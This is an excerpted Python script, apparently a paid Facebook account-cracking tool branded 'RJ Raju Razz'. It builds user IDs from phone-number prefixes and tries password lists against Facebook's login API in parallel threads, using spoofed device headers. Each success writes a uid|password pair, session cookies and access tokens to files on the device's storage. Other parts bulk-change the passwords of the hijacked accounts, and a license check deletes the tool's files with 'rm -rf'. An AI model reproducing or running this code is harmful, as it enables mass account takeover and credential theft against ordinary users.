...
\033[1;97m===============================================================
\033[1;97m[+]\033[1;97m    AUTHOR   \033[1;97m: \033[1;92mRJ Raju Razz
\033[1;97m[+]\033[1;97m    FACEBOOK \033[1;97m: \033[1;92mRJ Raju Razz
\033[1;97m[+]\033[1;97m    GITHUB \033[1;97m: \033[1;92m  RJRajuRazz
\033[1;97m===============================================================
\x1b[31;1m   \x1b[47;2m[ THIS TOOL IS FREE ]\x1b[00;1m\x1b[31;1m \x1b[31;1m \x1b[47;2m[ POWERED BY RJ Raju Razz ]\x1b[00;1m\x1b[31;1m
\033[1;97m===============================================================

                 \x1b[31;1m   \x1b[47;2m[ SCRIPT OF RJ RAJU RAZZ]\x1b[00;1m\x1b[31;1m

\033[1;97m===============================================================
\033[1;97m VERSION:\033[1;92m 3.0
...
def iAmApprovelSystem():
	...
	if 'free' in str(server_keys):
		...
		if str(bumper)+'|fuck' in server_keys:
			...
			os.system("rm -rf d64 d32 RJ Raju Razz")
			exit()
...
def buy():
	...
	print(" [•] Payment : Paytm/Google Pay")
	print(' [•] Paytm Number : 9954282827 ')
	print(" [•] Token : %s"%(bumper))
	print(" [•] Copy & send Token to Admun to get approved ")
	print(" [•] Feel The Power Of RJ Hacking Paid Tools😈☝🤍")
	line()
	exit()
...
class iAmMain:
	...
	def num_menu(self):
		...
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = code+user
				if "i" in pwx_:
					pwx = [user,uid,"Baishya1122","DasBaishya","Baishya123","first123","i love you","baishya1234","baishya12345"]
	...
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RJ Raju Razz] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[RJ Raju Razz-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/RJ Raju Razz_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RJ Raju Razz_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RJ Raju Razz-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RJ Raju Razz_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RJ Raju Razz] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': connection_token()}
				...
				if "session_key" in q:
					...
					ok.append(uid)
					open('/sdcard/RJ Raju Razz_M2_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RJ Raju Razz_M2_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RJ Raju Razz-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RJ Raju Razz_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RJ Raju Razz %s |  OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[RJ Raju Razz-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/RJ Raju Razz-OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RJ Raju Razz-COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RJ Raju Razz-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RJ Raju Razz-CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RJ Raju Razz] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
			...
			for ps in pwx:
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[RJ Raju Razz-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/RJ Raju Razz_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RJ Raju Razz_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RJ Raju Razz-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RJ Raju Razz_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
	...
	def r_crack(self,uid,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [RJ Raju Razz] %s | Random\ OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			for pw in pwx:
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				...
				if "session_key" in q:
					...
					p('\r\033[1;92m[RJ Raju Razz-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/RJ Raju Razz_NUM_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/RJ Raju Razz_NUM_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[RJ Raju Razz-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/RJ Raju Razz_NUM_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
...
class Join:
	def __init_(self):
		logo()
		#s.system("xdg-open https://wa.me/+919954282827")
	def Whatsapp(self):
		os.system('xdg-open https://chat.whatsapp.com/DbftM3A3lwn6VFGwYa9FZJ')
		iAmMain().iAmMenu()
	def Facebook(self):
...
class automation:
	...
	def iAmPasswordManager(self):
		logo()
		p(" [•] Password Changer By : RJ Raju Razz")
		line()
	...
	def bulk_password(self):
		...
		try:
			...
			iamdefaultpassword = "RJ Raju Razz@@@"
		logo()
		p(" [•] Password Changer By : RJ Raju Razz")
		line()
	...
	def change_default(self):
		...
		try:
			...
			iamdefaultpassword = "RJ Raju Razz786"
